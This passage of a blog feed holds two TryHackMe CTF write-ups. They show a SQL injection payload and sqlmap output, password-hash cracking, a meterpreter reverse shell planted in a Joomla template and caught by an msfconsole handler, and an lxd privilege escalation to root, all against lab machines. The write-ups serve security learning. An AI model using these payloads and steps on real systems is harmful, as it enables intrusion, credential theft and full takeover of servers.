&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;FLAG03&lt;/blockquote&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-14.17.49.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE html PUBLIC"-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"
&amp;lt;html&amp;gt;

	&amp;lt;head&amp;gt;
		&amp;lt;meta content="text/html;charset=utf-8" http-equiv="Content-Type"&amp;gt;
		&amp;lt;meta content="utf-8" http-equiv="encoding"&amp;gt;
		&amp;lt;p hidden&amp;gt;Seriously! You think the php script inside the source code? Pfff.. take this easter 3: THM{y0u_c4n'7_533_m3}&amp;lt;/p&amp;gt; 
		&amp;lt;title&amp;gt;Can you find the egg?&amp;lt;/title&amp;gt;
		&amp;lt;h1&amp;gt;Just an ordinary login form!&amp;lt;/h1&amp;gt;
	&amp;lt;/head&amp;gt;
	
	&amp;lt;body&amp;gt;
		
		&amp;lt;p&amp;gt;You don't need to register yourself&amp;lt;/p&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;
		&amp;lt;form method='POST'&amp;gt;
			Username:&amp;lt;br&amp;gt;
			&amp;lt;input type="text" name="username" required&amp;gt;
			&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;
			Password:&amp;lt;br&amp;gt;
			&amp;lt;input type="text" name="password" required&amp;gt;
			&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;
			&amp;lt;button name="submit" value="submit"&amp;gt;Login&amp;lt;/button&amp;gt;
		&amp;lt;/form&amp;gt;

			&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the &lt;strong&gt;/login&lt;/strong&gt; source code, contains our flag.&lt;/p&gt;&lt;blockquote&gt;FLAG04&lt;/blockquote&gt;&lt;p&gt;In this flag we will intercept our data from the &lt;strong&gt;POST&lt;/strong&gt; method, saved it as a text file, I called it r.txt and then you take that data and use it with SQLmap to perform a SQL POST injection.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-14.24.11.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# sqlmap -r r.txt --dbs
        ___
       __H__                                                                        
 ___ ___[.]_____ ___ ___  {1.4#stable}                                              
|_ -| . [,]     | .'| . |                                                           
|___|_  [)]_|_|_|__,|  _|                                                           
      |_|V...       |_|   http://sqlmap.org                                         

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:29:42 /2020-04-09/

[13:29:42] [INFO] parsing HTTP request from 'r.txt'
[13:29:42] [INFO] resuming back-end DBMS 'mysql' 
[13:29:42] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 2159 FROM (SELECT(SLEEP(5)))vqEg) AND 'iFUy'='iFUy&amp;amp;password=admin&amp;amp;submit=submit
---
[13:29:42] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL &amp;gt;= 5.0.12
[13:29:42] [INFO] fetching database names
[13:29:42] [INFO] fetching number of databases
[13:29:42] [INFO] resumed: 4
[13:29:42] [INFO] resumed: information_schema
[13:29:42] [INFO] resumed: THM_f0und_m3
[13:29:42] [INFO] resumed: mysql
[13:29:42] [INFO] resumed: performance_schema
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] THM_f0und_m3

[13:29:42] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.194.62'                                                                           
[13:29:42] [WARNING] you haven't updated sqlmap for more than 99 days!!!

[*] ending @ 13:29:42 /2020-04-09/

root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-14.35.29.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;figcaption&gt;Our flag is in the column Easter, the table nothing_inside, and the database THM_f0und_m3&lt;/figcaption&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG05&lt;/blockquote&gt;&lt;p&gt;For flag number 5, we continue digging in the database for credentials, two usernames are available, and only one contain an &lt;strong&gt;md5&lt;/strong&gt; hash.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-14.46.03.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;p&gt;After decrypting the hash we try the credentials in the &lt;strong&gt;/login&lt;/strong&gt; page and we get the flag.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-14.47.08.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG06&lt;/blockquote&gt;&lt;p&gt;For flag number 6, there's a hint giving with the question telling us to check for the main page header. After checking the headers requests, we owned the flag.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;HTTP/1.1 200 OK
Date: Thu, 09 Apr 2020 13:57:02 GMT
Server: Apache/2.2.22 (Ubuntu)
X-Powered-By: PHP/5.3.10-1ubuntu3.26
Busted: Hey, you found me, take this Easter 6: THM{l37'5_p4r7y_h4rd}
Vary: Accept-Encoding
Connection: close
Content-Type: text/html
Content-Length: 94328&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;Flag07&lt;/blockquote&gt;&lt;p&gt;In this challenge we have to use the "Invited cookie" with burpsuite, we pass it a number that we have to guess or brute-force but obviously it's A one, and it's the right invite cookie and you'll get the sixth flag&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.03.09.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG08&lt;/blockquote&gt;&lt;p&gt;For flag number 8, The front page source code says that you have to be an iphone to access the content, all you have to do is to modify the User Agent for your request from the original one to an iphone one, and you get the flag.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.03.44.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG09&lt;/blockquote&gt;&lt;p&gt;When we visit the &lt;strong&gt;/ready&lt;/strong&gt; page and use burp to take control of each request, we check the source code of the page we get the flag number 09.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.06.50.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG10&lt;/blockquote&gt;&lt;p&gt;In Flag number 10, you will need to send a &lt;strong&gt;GET&lt;/strong&gt; request with a referrer as 'tryhackme.com' to get back the flag from the page.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.13.09.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG11&lt;/blockquote&gt;&lt;p&gt;In the options on the main page, we see four choices, but we see that "Deskel" prefers egg. We send egg instead of the salad we make DesKel happy and we get the Flag number 10.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.17.18.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG12&lt;/blockquote&gt;&lt;p&gt;don't worry there's always hints in the questions, no need to stress on reading, doing is much easier ... anyway, there's a javascript code in the page go check it, they'll be a function there containing our flag&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.18.28.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG13&lt;/blockquote&gt;&lt;p&gt;Flag number 13 is related to Flag 9, fallow the lead from 9 to 13, same dynamic, source code...&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-18.06.08.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG14&lt;/blockquote&gt;&lt;p&gt;For flag 14, it's straight forward, the main page source code contain the flag as a png encoded to base64, decode it, and get the flag from the picture.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.19.09-1.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.21.16.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG15&lt;/blockquote&gt;&lt;p&gt;For this Flag, we will play some guessing games, don't get emotional about it, but you are going to lose some brain cells.&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/o331JNuNm9fZ6" width="480" height="269" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/morgan-freeman-one-hand-two-hands-o331JNuNm9fZ6"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.23.18.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.43.53.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Each alphabet is a special hash number, guess the alphabet of each number of the hint, You'll get the flag.&lt;/p&gt;&lt;blockquote&gt;FLAG16&lt;/blockquote&gt;&lt;p&gt;Flag number 16 is very very easy, all you have to do is to click the three buttons on the browser all three at once, and you'll get the flag number 16.&lt;/p&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-18.18.07.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;figcaption&gt;use BURP!&lt;/figcaption&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG17&lt;/blockquote&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.53.57.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;figcaption&gt;Binary baby!&lt;/figcaption&gt;&lt;/figure&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/VbEloWwOz3QqYBsqIZ" width="480" height="480" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/OTHERCOLORS-matrix-illusion-already-been-made-VbEloWwOz3QqYBsqIZ"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;pre&gt;&lt;code&gt;Binary &amp;gt; Hex &amp;gt; Text&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;FLAG18&lt;/blockquote&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-18.22.24.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Just say yes for eggs and you'll be given the flag.&lt;/p&gt;&lt;blockquote&gt;FLAG19&lt;/blockquote&gt;&lt;p&gt;For this flag, when you check the source code of the page, you see that a png image is there but it's not displayed, go get the picture, You get the flag number 19.&lt;/p&gt;&lt;blockquote&gt;FLAG20&lt;/blockquote&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-18.25.07.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-18.25.29.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;p&gt;And that's it for today, thank for participating in this 20Flag marathon ...&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/URuzvsMZNVm2wRd9K3" width="480" height="360" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/memecandy-URuzvsMZNVm2wRd9K3"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;Happy Hacking!&lt;/p&gt;</content:encoded></item><item><title>JockerCTF | write-up</title><description>&lt;p&gt;Hello world, I hope you are all well and safe home from the pandemic, today's challenge is a CTF by Tryhackme it's rated medium, but still it needs focus and trying the right techniques, or you'll just dive in a rabbit hole.&lt;/p&gt;&lt;p&gt;Let's get started with some enumeration ...&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:&lt;/code&gt;&lt;/pre&gt;</description><link>http://localhost:2368/jockerctf-write-up/</link><guid isPermaLink="false">5e8caabb75832c27370ae6e1</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Tue, 07 Apr 2020 16:31:26 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/joker.jpg" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/joker.jpg" alt="JockerCTF | write-up"&gt;&lt;p&gt;Hello world, I hope you are all well and safe home from the pandemic, today's challenge is a CTF by Tryhackme it's rated medium, but still it needs focus and trying the right techniques, or you'll just dive in a rabbit hole.&lt;/p&gt;&lt;p&gt;Let's get started with some enumeration ...&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sV -sC 10.10.215.43 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 16:30 UTC
Nmap scan report for ip-10-10-215-43.eu-west-1.compute.internal (10.10.215.43)
Host is up (0.0010s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ad:20:1f:f4:33:1b:00:70:b3:85:cb:87:00:c4:f4:f7 (RSA)
|   256 1b:f9:a8:ec:fd:35:ec:fb:04:d5:ee:2a:a1:7a:4f:78 (ECDSA)
|_  256 dc:d7:dd:6e:f6:71:1f:8c:2c:2c:a1:34:6d:29:99:20 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HA: Joker
8080/tcp open  http    Apache httpd 2.4.29
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Please enter the password.
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 401 Unauthorized
MAC Address: 02:9E:D8:EE:E7:2C (Unknown)
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.18 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-17.31.50.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-17.32.05.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/12qASHliHqDPSo" width="328" height="480" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/joker-12qASHliHqDPSo"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;well well well, we have three ports &lt;strong&gt;ssh&lt;/strong&gt; on 22 and some &lt;strong&gt;apache&lt;/strong&gt; on 80 and 8080, It seems that we need credentials to access something in port 8080.&lt;/p&gt;&lt;p&gt;we'll dig more in port 80 and see if we have any interesting directories and files.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# dirb http://10.10.215.43/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Apr  7 16:37:56 2020
URL_BASE: http://10.10.215.43/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.215.43/ ----
==&amp;gt; DIRECTORY: http://10.10.215.43/css/                                            
==&amp;gt; DIRECTORY: http://10.10.215.43/img/                                            
+ http://10.10.215.43/index.html (CODE:200|SIZE:5954)                              
+ http://10.10.215.43/phpinfo.php (CODE:200|SIZE:94848)                            
+ http://10.10.215.43/server-status (CODE:403|SIZE:277)  &lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code class="language-markup"&gt;root@kali:~# dirb http://10.10.215.43/ -X .txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Apr  7 16:38:47 2020
URL_BASE: http://10.10.215.43/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
EXTENSIONS_LIST: (.txt) | (.txt) [NUM = 1]

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.215.43/ ----
+ http://10.10.215.43/secret.txt (CODE:200|SIZE:320)                               
                                                                                   
-----------------
END_TIME: Tue Apr  7 16:38:49 2020
DOWNLOADED: 4612 - FOUND: 1
root@kali:~# &lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-17.40.16.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;And we have a secret conversation between Batman and the Joker, checking other directories and backend php file info doesn't give us anything for now ...&lt;/p&gt;&lt;p&gt;our next shot, some brute-forcing in port 8080 and using Batman or Joker as a username and see what we get.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-19.30.39.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Xhydra is the GUI version of hydra, both of them work fine. But I choose the GUI version because it was faster and less troubleshooting for my machine.&lt;/p&gt;&lt;p&gt;the password used by Joker is h****h, with dirbuster or dirb or gobuster we can't look for directories so we will use nikto with the credentials, and see if we can do anything with them 🙃&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nikto -h http://10.10.215.43:8080/ -id joker:h****h
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.215.43
+ Target Hostname:    10.10.215.43
+ Target Port:        8080
+ Start Time:         2020-04-07 18:31:07 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ / - Requires Authentication for realm ' Please enter the password.'
+ Successfully authenticated to realm ' Please enter the password.' with user-supplied credentials.
+ Entry '/administrator/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/bin/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/cache/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/cli/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/components/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/includes/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/language/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/layouts/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/libraries/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/modules/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/plugins/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/tmp/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 14 entries which should be manually viewed.
+ /backup.zip: Potentially interesting archive/cert file found.
+ /backup.zip: Potentially interesting archive/cert file found. (NOTE: requested by IP address).
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ Uncommon header 'tcn' found, with contents: choice
+ OSVDB-3092: /web.config: ASP config file is accessible.
+ OSVDB-8193: /index.php?module=ew_filemanager&amp;amp;type=admin&amp;amp;func=manager&amp;amp;pathext=../../../etc: EW FileManager for PostNuke allows arbitrary file retrieval.
+ OSVDB-3092: /administrator/: This might be interesting...
+ OSVDB-3092: /bin/: This might be interesting...
+ OSVDB-3092: /includes/: This might be interesting...
+ OSVDB-3092: /tmp/: This might be interesting...
+ OSVDB-3092: /README: README file found.
+ OSVDB-3092: /LICENSE.txt: License file found may identify site software.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /htaccess.txt: Default Joomla! htaccess.txt file found. This should be removed or renamed.
+ /administrator/index.php: Admin login page/section found.
+ 8719 requests: 0 error(s) and 34 item(s) reported on remote host
+ End Time:           2020-04-07 18:31:43 (GMT0) (36 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;we gathered a lot of useful information, the first thing that got my attention was the &lt;strong&gt;backup.zip&lt;/strong&gt; file and the &lt;strong&gt;/administrator&lt;/strong&gt; directory.&lt;/p&gt;&lt;p&gt;After downloading the backup.zip file it was encrypted, but not for so long ...&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/26xBN6I5tVKveX2wg" width="480" height="256" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/johnwick2-lionsgate-john-wick-26xBN6I5tVKveX2wg"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;pre&gt;&lt;code&gt;root@kali:~/Downloads# zip2john backup.zip &amp;gt; hash
root@kali:~/Downloads# john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
h****h           (backup.zip)
1g 0:00:00:00 DONE (2020-04-07 18:34) 100.0g/s 409600p/s 409600c/s 409600C/s 123456..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Thank you Joker for using the same passwords 😶, after decompressing the backup we found a database and a backup of the whole site. &lt;/p&gt;&lt;p&gt;the database contained the credentials to access the running site and that's what we did, our next step will be getting a reverse shell, obviously, after we decrypt the admin password ... obviously &lt;/p&gt;&lt;pre&gt;&lt;code&gt;INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User','admin','admin@example.com','$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG',0,1,'2019-10-08 12:00:15',&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-19.45.31.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;" target="_blankroot@kali:~# john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
a******4         (?)
1g 0:00:00:14 DONE (2020-04-07 18:48) 0.06997g/s 71.79p/s 71.79c/s 71.79C/s bullshit..bulldogs
Use the "--show" option to display all of the cracked passwords reliably
Session completed
root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-19.50.16.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-19.50.50.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;go to extension, and upload your reverse shell. I created mine with msfvenom the payload &lt;strong&gt;php/meterpreter/reverse_tcp&lt;/strong&gt; exported it as raw php and uploaded it in the error.php file and previewed it from the site and it called back to us.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# msfconsole
[-] ***rting the Metasploit Framework console.../
[-] * WARNING: No database support: No database YAML file
[-] ***
                                                  
     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


       =[ metasploit v5.0.71-dev                          ]
+ -- --=[ 1962 exploits - 1095 auxiliary - 336 post       ]
+ -- --=[ 558 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 &amp;gt; use exploit/multi/handler
msf5 exploit(multi/handler) &amp;gt; set payload php/meterpreter/reverse_tcp
payload =&amp;gt; php/meterpreter/reverse_tcp                                              
msf5 exploit(multi/handler) &amp;gt; set lhost 10.10.188.92                                
lhost =&amp;gt; 10.10.188.92                                                               
msf5 exploit(multi/handler) &amp;gt; set lport 7878                                        
lport =&amp;gt; 7878                                                                       
msf5 exploit(multi/handler) &amp;gt; run                                                   
                                                                                    
[*] Started reverse TCP handler on 10.10.188.92:7878                                
[*] Sending stage (38288 bytes) to 10.10.215.43                                     
[*] Meterpreter session 1 opened (10.10.188.92:7878 -&amp;gt; 10.10.215.43:34370) at 2020-04-07 19:00:43 +0000                                                                 
                                                                                    
meterpreter &amp;gt; getuid
Server username: www-data (33)                                                      
meterpreter &amp;gt;                          &lt;/code&gt;&lt;/pre&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/UoYA5jnXE5V7u4MJh7" width="480" height="480" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/joker-the-dark-knight-washing-hands-UoYA5jnXE5V7u4MJh7"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-20.06.11.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;if we look closer we are part of a group called lxd, for me, I just learned what is lxd (linux containers) and how do they work ... I would suggest reading the article that I'll leave at the end, so you can learn more about lxd and the privilege escalation that can be done.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-07-at-20.07.56.png" class="kg-image" alt="JockerCTF | write-up"&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code class="language-markup"&gt;$ lxc init myalpine joker -c security.privileged=true
Creating Joker
$ lxc config device add joker mydevice disk source=/ path=/mnt/root recursive=true
$ lxc start joker
$ lxc exec ignite /bin/sh
whoami
root&lt;/code&gt;&lt;/pre&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/p8EJ11ZuJlIxG" width="480" height="270" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/reaction-p8EJ11ZuJlIxG"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;That's it for today, stay safe, and HAPPY HACKING!&lt;/p&gt;&lt;figure class="kg-card kg-embed-card"&gt;&lt;blockquote class="wp-embedded-content"&gt;&lt;a href="https://www.hackingarticles.in/lxd-privilege-escalation/"&gt;Lxd Privilege Escalation&lt;/a&gt;&lt;/blockquote&gt;
